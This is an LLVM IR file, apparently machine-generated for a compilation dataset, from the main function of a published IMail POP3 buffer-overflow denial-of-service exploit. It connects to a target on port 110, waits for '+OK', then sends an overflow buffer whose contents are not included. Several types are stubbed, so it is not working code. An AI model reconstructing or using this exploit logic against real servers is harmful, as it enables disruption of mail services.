; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_19616.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_19616.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i64, i32 }
%struct.sockaddr_in = type { %struct.in_addr, i32, i32 }
%struct.in_addr = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [21 x i8] c"IMAIL POP3 Overflow\0A\00", align 1
@.str.1 = private unnamed_addr constant [20 x i8] c"By: Mike@eEye.com\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [29 x i8] c"Usage: %s [hostname] [port]\0A\00", align 1
@.str.3 = private unnamed_addr constant [39 x i8] c"If port is not specified we use '110'\0A\00", align 1
@.str.4 = private unnamed_addr constant [4 x i8] c"110\00", align 1
@.str.5 = private unnamed_addr constant [23 x i8] c"ERROR: Uknown host %s\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@SOCKET_ERROR = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [21 x i8] c"ERROR: Socket Error\0A\00", align 1
@.str.7 = private unnamed_addr constant [22 x i8] c"ERROR: Connect Error\0A\00", align 1
@.str.8 = private unnamed_addr constant [54 x i8] c"Connected to [%s] on port [%d], sending overflow....\0A\00", align 1
@.str.9 = private unnamed_addr constant [19 x i8] c"ERROR: Recv Error\0A\00", align 1
@.str.10 = private unnamed_addr constant [4 x i8] c"+OK\00", align 1
@.str.11 = private unnamed_addr constant [44 x i8] c"ERROR: NO +OK response from inital connect\0A\00", align 1
@overflow = common dso_local global i32 0, align 4
@.str.12 = private unnamed_addr constant [19 x i8] c"ERROR: Send Error\0A\00", align 1
@.str.13 = private unnamed_addr constant [7 x i8] c"Sent.\0A\00", align 1
@stderr = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca [300 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i16, align 2
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %14 = load i32, i32* %4, align 4
  %15 = icmp sle i32 %14, 1
  br i1 %15, label %16, label %25

16:                                               ; preds = %2
  %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str, i64 0, i64 0))
  %18 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.1, i64 0, i64 0))
  %19 = load i8**, i8*** %5, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.2, i64 0, i64 0), i8* %21)
  %23 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.3, i64 0, i64 0))
  %24 = call i32 @exit(i32 0) #4
  unreachable

25:                                               ; preds = %2
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 1
  %28 = load i8*, i8** %27, align 8
  store i8* %28, i8** %12, align 8
  %29 = load i8**, i8*** %5, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 2
  %31 = load i8*, i8** %30, align 8
  %32 = icmp ne i8* %31, null
  br i1 %32, label %33, label %38

33:                                               ; preds = %25
  %34 = load i8**, i8*** %5, align 8
  %35 = getelementptr inbounds i8*, i8** %34, i64 2
  %36 = load i8*, i8** %35, align 8
  %37 = call zeroext i16 @atoi(i8* %36)
  store i16 %37, i16* %13, align 2
  br label %40

38:                                               ; preds = %25
  %39 = call zeroext i16 @atoi(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.4, i64 0, i64 0))
  store i16 %39, i16* %13, align 2
  br label %40

40:                                               ; preds = %38, %33
  %41 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str, i64 0, i64 0))
  %42 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.1, i64 0, i64 0))
  %43 = load i8*, i8** %12, align 8
  %44 = call %struct.hostent* @gethostbyname(i8* %43)
  store %struct.hostent* %44, %struct.hostent** %6, align 8
  %45 = load %struct.hostent*, %struct.hostent** %6, align 8
  %46 = icmp eq %struct.hostent* %45, null
  br i1 %46, label %47, label %51

47:                                               ; preds = %40
  %48 = load i8*, i8** %12, align 8
  %49 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.5, i64 0, i64 0), i8* %48)
  %50 = call i32 @exit(i32 -1) #4
  unreachable

51:                                               ; preds = %40
  %52 = load %struct.hostent*, %struct.hostent** %6, align 8
  %53 = getelementptr inbounds %struct.hostent, %struct.hostent* %52, i32 0, i32 1
  %54 = load i32, i32* %53, align 8
  %55 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  store i32 %54, i32* %55, align 4
  %56 = load i16, i16* %13, align 2
  %57 = call i32 @htons(i16 zeroext %56)
  %58 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i32 %57, i32* %58, align 4
  %59 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  %60 = load %struct.hostent*, %struct.hostent** %6, align 8
  %61 = getelementptr inbounds %struct.hostent, %struct.hostent* %60, i32 0, i32 0
  %62 = load i64, i64* %61, align 8
  %63 = inttoptr i64 %62 to %struct.in_addr*
  %64 = bitcast %struct.in_addr* %59 to i8*
  %65 = bitcast %struct.in_addr* %63 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %64, i8* align 4 %65, i64 4, i1 false)
  %66 = load i32, i32* @AF_INET, align 4
  %67 = load i32, i32* @SOCK_STREAM, align 4
  %68 = call i32 @socket(i32 %66, i32 %67, i32 0)
  store i32 %68, i32* %10, align 4
  %69 = load i32, i32* @SOCKET_ERROR, align 4
  %70 = icmp eq i32 %68, %69
  br i1 %70, label %71, label %74

71:                                               ; preds = %51
  %72 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.6, i64 0, i64 0))
  %73 = call i32 @exit(i32 -1) #4
  unreachable

74:                                               ; preds = %51
  %75 = load i32, i32* %10, align 4
  %76 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %77 = call i32 @connect(i32 %75, %struct.sockaddr* %76, i32 12)
  %78 = load i32, i32* @SOCKET_ERROR, align 4
  %79 = icmp eq i32 %77, %78
  br i1 %79, label %80, label %86

80:                                               ; preds = %74
  %81 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.7, i64 0, i64 0))
  %82 = load i32, i32* %10, align 4
  %83 = call i32 @closesocket(i32 %82)
  %84 = call i32 (...) @WSACleanup()
  %85 = call i32 @exit(i32 -1) #4
  unreachable

86:                                               ; preds = %74
  %87 = load i8*, i8** %12, align 8
  %88 = load i16, i16* %13, align 2
  %89 = zext i16 %88 to i32
  %90 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.8, i64 0, i64 0), i8* %87, i32 %89)
  %91 = load i32, i32* %10, align 4
  %92 = getelementptr inbounds [300 x i8], [300 x i8]* %8, i64 0, i64 0
  %93 = call i32 @recv(i32 %91, i8* %92, i32 300, i32 0)
  store i32 %93, i32* %11, align 4
  %94 = load i32, i32* @SOCKET_ERROR, align 4
  %95 = icmp eq i32 %93, %94
  br i1 %95, label %96, label %102

96:                                               ; preds = %86
  %97 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.9, i64 0, i64 0))
  %98 = load i32, i32* %10, align 4
  %99 = call i32 @closesocket(i32 %98)
  %100 = call i32 (...) @WSACleanup()
  %101 = call i32 @exit(i32 1) #4
  unreachable

102:                                              ; preds = %86
  %103 = load i32, i32* %11, align 4
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds [300 x i8], [300 x i8]* %8, i64 0, i64 %104
  store i8 0, i8* %105, align 1
  %106 = getelementptr inbounds [300 x i8], [300 x i8]* %8, i64 0, i64 0
  %107 = call i8* @strstr(i8* %106, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.10, i64 0, i64 0))
  store i8* %107, i8** %9, align 8
  %108 = load i8*, i8** %9, align 8
  %109 = icmp eq i8* %108, null
  br i1 %109, label %110, label %116

110:                                              ; preds = %102
  %111 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.11, i64 0, i64 0))
  %112 = load i32, i32* %10, align 4
  %113 = call i32 @closesocket(i32 %112)
  %114 = call i32 (...) @WSACleanup()
  %115 = call i32 @exit(i32 -1) #4
  unreachable

116:                                              ; preds = %102
  %117 = load i32, i32* %10, align 4
  %118 = load i32, i32* @overflow, align 4
  %119 = load i32, i32* @overflow, align 4
  %120 = call i32 @strlen(i32 %119)
  %121 = call i32 @send(i32 %117, i32 %118, i32 %120, i32 0)
  %122 = load i32, i32* @SOCKET_ERROR, align 4
  %123 = icmp eq i32 %121, %122
  br i1 %123, label %124, label %130

124:                                              ; preds = %116
  %125 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.12, i64 0, i64 0))
  %126 = load i32, i32* %10, align 4
  %127 = call i32 @closesocket(i32 %126)
  %128 = call i32 (...) @WSACleanup()
  %129 = call i32 @exit(i32 -1) #4
  unreachable

130:                                              ; preds = %116
  %131 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.13, i64 0, i64 0))
  %132 = load i32, i32* %10, align 4
  %133 = call i32 @closesocket(i32 %132)
  %134 = call i32 (...) @WSACleanup()
  %135 = load i32, i32* %3, align 4
  ret i32 %135
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local zeroext i16 @atoi(i8*) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @htons(i16 zeroext) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #3

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @closesocket(i32) #1

declare dso_local i32 @WSACleanup(...) #1

declare dso_local i32 @recv(i32, i8*, i32, i32) #1

declare dso_local i8* @strstr(i8*, i8*) #1

declare dso_local i32 @send(i32, i32, i32, i32) #1

declare dso_local i32 @strlen(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { argmemonly nounwind willreturn }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
